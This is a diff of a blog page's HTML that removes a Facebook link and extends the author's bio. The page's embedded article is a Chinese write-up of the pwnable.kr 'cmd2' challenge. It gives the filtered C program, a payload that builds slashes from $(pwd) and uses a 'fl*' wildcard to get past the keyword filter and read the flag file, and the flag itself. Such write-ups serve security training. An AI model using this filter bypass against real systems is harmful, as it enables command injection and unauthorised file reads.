@@ -19,7 +19,7 @@
             <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
         
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"cmd1 的進階題！\n\n\n原始碼：\n12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123;\tint r=0;\tr += strstr(cmd, &quot;=&quot;)!=0;\tr += strstr(cmd, &quot;PATH&quot;)!=0;\tr += strstr(cmd, &quot;export&quot;)!=0;\tr += strstr(cmd, &quot;/&quot;)!=0;\tr += strstr(cmd, &quot;`&quot;)!=0;\tr += strstr(cmd, &quot;flag&quot;)!=0;\treturn r;&#125;extern char** environ;void delete_env()&#123;\tchar** p;\tfor(p=environ; *p; p++)\tmemset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123;\tdelete_env();\tputenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);\tif(filter(argv[1])) return 0;\tprintf(&quot;%s\\n&quot;, argv[1]);\tsystem( argv[1] );\treturn 0;&#125;\n\n可以看到相較於cmd1，條件限制更嚴苛了，修改環境變數或是使用絕對路徑的方式都會被過濾。\n其實還有一個方法可以使用絕對路徑但斜線又不會被過濾到，利用Linux指令pwd顯示當前路徑的方法，只要先進到根目錄，那麼pwd就會是/，便可以構造出像這樣的字串：\n1234cmd2@ubuntu:~$ cd /cmd2@ubuntu:/$ ./home/cmd2/cmd2 &#x27;&quot;&quot;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*&quot;&quot;&#x27;&quot;&quot;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*&quot;&quot;FuN_w1th_5h3ll_v4riabl3s_haha","dateCreated":"2017-07-08T05:06:12+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2017-07-08T05:06:12+00:00","description":"cmd1 的進階題！","headline":"pwnable.kr #cmd2","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-cmd2/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-cmd2/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"cmd1 的進階題！\n\n\n原始碼：\n12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123;\tint r=0;\tr += strstr(cmd, &quot;=&quot;)!=0;\tr += strstr(cmd, &quot;PATH&quot;)!=0;\tr += strstr(cmd, &quot;export&quot;)!=0;\tr += strstr(cmd, &quot;/&quot;)!=0;\tr += strstr(cmd, &quot;`&quot;)!=0;\tr += strstr(cmd, &quot;flag&quot;)!=0;\treturn r;&#125;extern char** environ;void delete_env()&#123;\tchar** p;\tfor(p=environ; *p; p++)\tmemset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123;\tdelete_env();\tputenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);\tif(filter(argv[1])) return 0;\tprintf(&quot;%s\\n&quot;, argv[1]);\tsystem( argv[1] );\treturn 0;&#125;\n\n可以看到相較於cmd1，條件限制更嚴苛了，修改環境變數或是使用絕對路徑的方式都會被過濾。\n其實還有一個方法可以使用絕對路徑但斜線又不會被過濾到，利用Linux指令pwd顯示當前路徑的方法，只要先進到根目錄，那麼pwd就會是/，便可以構造出像這樣的字串：\n1234cmd2@ubuntu:~$ cd /cmd2@ubuntu:/$ ./home/cmd2/cmd2 &#x27;&quot;&quot;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*&quot;&quot;&#x27;&quot;&quot;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*&quot;&quot;FuN_w1th_5h3ll_v4riabl3s_haha","dateCreated":"2017-07-08T05:06:12+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2017-07-08T05:06:12+00:00","description":"cmd1 的進階題！","headline":"pwnable.kr #cmd2","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-cmd2/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-cmd2/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
     
     <meta name="description" content="cmd1 的進階題！">
 <meta property="og:type" content="blog">
@@ -122,7 +122,7 @@
                 </a>
                 <h4 class="sidebar-profile-name">Theo Chen</h4>
                 
-                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </h5>
                 
             </div>
@@ -233,22 +233,6 @@
                         >
                         <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.facebook.com/profile.php?id=100009076420659"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
                     </a>
             </li>
             
@@ -631,7 +615,7 @@
         
             <h4 id="about-card-name">Theo Chen</h4>
         
-            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </div>
         
         
